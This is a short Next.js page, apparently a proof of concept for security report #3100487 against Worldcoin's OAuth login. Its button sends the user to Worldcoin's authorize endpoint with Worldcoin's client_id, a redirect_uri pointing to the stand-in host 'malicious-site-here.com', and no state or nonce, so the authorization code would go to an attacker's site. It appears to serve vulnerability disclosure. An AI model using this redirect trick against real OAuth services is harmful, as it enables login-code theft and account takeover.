'use client'

import Image from "next/image"
import { Tokens } from 'next-world-auth'
import { useWorldAuth } from 'next-world-auth/react'
export default function Home() {
  const { isLoading, isInstalled, isAuthenticated, session, signInWorldID, signInWallet, signOut, getLocation, pay } = useWorldAuth()
  const report3100487= async () => {
    const params = new URLSearchParams({
      redirect_uri: 'https://malicious-site-here.com/auth/callback',
      //redirect_uri: 'https://auth.operator.worldcoin.org/login/callback',
      //redirect_uri: 'worldapp://grants/login/callback',
      response_type: 'code',
      //state: 'myState',
      //nonce: 'shouldBeRandom',
      response_mode: 'query',
      scope: 'openid profile email',
      client_id: 'app_d2905e660b94ad24d6fc97816182ab35', // Worldcoin
      // client_id: 'app_e1beb4eee66ec6ec4c6684d81b878ff7' // https://world.org/ecosystem/app_e1beb4eee66ec6ec4c6684d81b878ff7
      //client_id: process.env.NEXT_PUBLIC_WLD_CLIENT_ID || ''
    })
    
    const location = `https://id.worldcoin.org/authorize?${params.toString()}`
    window.location.href = location
    // Dead
  }
  return (
    <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 sm:p-20 font-[family-name:var(--font-geist-sans)] text-center">
      <main className="flex flex-col gap-1 row-start-2 items-center">
        <div className="text-2xl font-bold p-8">Security Report #3100487</div>
        <button
          className="rounded-full border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center hover:bg-[#f2f2f2] dark:hover:bg-[#1a1a1a] hover:border-transparent text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 sm:min-w-44"
          onClick={report3100487}
        >
          Click to start
        </button>

      </main>
    </div>
  )
}